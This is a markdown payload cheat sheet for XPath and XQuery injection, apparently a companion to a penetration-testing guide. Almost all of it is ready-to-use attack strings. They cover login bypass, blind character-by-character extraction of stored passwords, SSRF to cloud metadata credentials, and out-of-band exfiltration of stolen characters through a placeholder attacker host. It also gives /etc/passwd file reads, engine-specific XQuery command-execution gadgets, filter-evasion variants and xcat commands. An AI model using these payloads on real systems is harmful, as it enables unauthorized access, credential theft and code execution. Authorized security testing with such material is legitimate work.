# XPath / XQuery Injection — Attack Arsenal

**Author:** x8bitranjit
Payloads, functions, and tools for the guide. Authorized targets only. Baseline every probe against a control. Remember: **XPath 1.0 has no comments** — balance the trailing quote.

---

## 0. Function cheat (your extraction toolkit)

| Function | Use |
|----------|-----|
| `substring(s, start, len)` | char-by-char extraction (1-indexed) |
| `string-length(s)` | value length discovery |
| `count(nodeset)` | number of nodes (records/fields) |
| `contains(s, sub)` / `starts-with(s, p)` | coarse matching |
| `name()` / `local-name()` | element name discovery (structure) |
| `position()` / `last()` | node navigation |
| `concat()` / `translate()` / `normalize-space()` | building/normalizing strings |
| `string-to-codepoints()` (2.0) | binary-search a character by codepoint |
| `doc()` / `document()` (2.0) | fetch a URL → **SSRF/OOB** |
| `unparsed-text()` (2.0) | read a local file → **file read** |
| `matches()` / `lower-case()` (2.0) | regex / case-insensitive matching |

---

## 1. Detection — error & boolean

```
# quote/error probes (find the context):
'      "      )      ]      '"      %27      ' or '

# always-TRUE (expect more/all/login-ok):
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or true() or '                # 2.0
1 or 1=1                        # numeric/position context

# always-FALSE (control):
' or '1'='2
' and '1'='2
x' or 1=2 or 'x'='y
```

## 2. Authentication bypass

```
# single-quote string context (username and/or password):
' or '1'='1
admin' or '1'='1
' or ''='
'or'1'='1
' or 1=1 or ''='
' or position()=1 or '

# double-quote context:
" or "1"="1
" or ""="

# union node-set breakout (widen results / disclose extra nodes):
']|//user|//a['
")]|//user/*|//x[("
' or name()='user' or '
```

## 3. Blind extraction (char-by-char → full dump)

```
# how many records / fields:
' or count(//user)=5 or 'x'='y
' or count(//user[1]/*)=4 or 'x'='y

# length of a value:
' or string-length((//user[1]/password))=32 or 'x'='y

# character at position i (iterate charset, then position, then record index):
' or substring((//user[1]/password),1,1)='a' or 'x'='y
' or substring((//user[1]/username),1,1)='a' or 'x'='y

# codepoint binary-search (2.0, fewer requests):
' or string-to-codepoints(substring((//user[1]/password),1,1))[1]>109 or 'x'='y

# element-name discovery (structure):
' or substring(name(//user[1]/*[2]),1,1)='p' or 'x'='y

# attributes / positional navigation:
//user[1]/@id
//user[position()=1]/child::node()[position()=2]
```
Loop: position 1..string-length, charset per position, then `//user[2]`, `//user[3]`, … to dump every record. Use `poc/xpath_blind.py`.

## 4. Error-based (when errors are verbose)
```
# force a type/eval error that echoes the selected value (engine-specific):
' or extractvalue-style / cast node-set into an erroring context
' and count(//user/password)=1 and string-length((//user[1]/password))>0 and error occurs
```

## 5. XPath 2.0/3.0 — SSRF, OOB, file read

```
# SSRF / OOB oracle (server fetches the URL):
' or doc('http://YOUR-OOB/x') or '
doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/')     # cloud metadata

# blind exfil via OOB hostname (put the stolen char in the DNS/host):
' or doc(concat('http://', substring((//user[1]/password),1,1), '.YOUR-OOB/')) or '

# arbitrary file read:
' or unparsed-text('file:///etc/passwd')
unparsed-text('file:///c:/windows/win.ini')
```

## 6. XQuery injection → RCE (native XML DBs — match the engine)

```
# BaseX:
'] , proc:system('id') , ('
# MarkLogic:
'] , xdmp:spawn(...) / xdmp:document-load('http://...') , ('
# eXist-db:
'] , util:eval("...") / file:read(...) , ('
# generic FLWOR pivot:
' return doc('...') (: ...
```
Engine-specific; confirm the XML DB first, then use its extension-function catalog.

## 7. WAF / filter bypass
```
'or'1'='1                       # remove spaces
' oR '1'='1                     # case
' or&#x20;'1'='1                # entity/encoding
' or '1'='1'                    # extra balance
concat('a','b')                 # avoid literal strings the filter blocks
translate('X','X','x')          # transform chars
%27%20or%20%271%27%3d%271       # url-encode
```

## 8. Tools

| Tool | Use |
|------|-----|
| **xcat** (`pip install xcat`) | The reference XPath-injection tool: auto blind extraction + OOB via `doc()` + file read; supports 1.0/2.0 |
| **Burp Suite** (Repeater/Intruder) | Manual boolean differential, quote-context discovery, charset iteration |
| **`poc/xpath_fuzz.py`** | Control-baselined detection + auth-bypass tester (single/double quote), low-FP |
| **`poc/xpath_blind.py`** | Blind `count`/`string-length`/`substring` char-by-char extractor (binary-search) |
| **Interactsh / your OOB** | `doc()` SSRF/OOB confirmation + blind exfil channel |
| local **BaseX / eXist-db** | Reproduce XQuery gadgets safely before firing on target |

## 9. xcat quick-start
```
xcat run <URL> <injectable_param> <other_params> --true-string="Welcome"   # inject + auto-extract
xcat run http://t/login username password --true-string="logged in" \
     -m POST -b username=admin -b password=x                              # POST body
# with OOB for speed / blind:  xcat --oob-ip YOUR-IP run ...
```

> Baseline every probe. A finding = a **steered, repeatable** change (login without password / data out / file read / code run) — not a lone error. Own/test accounts, one benign proof, redact secrets. Authorized targets only.
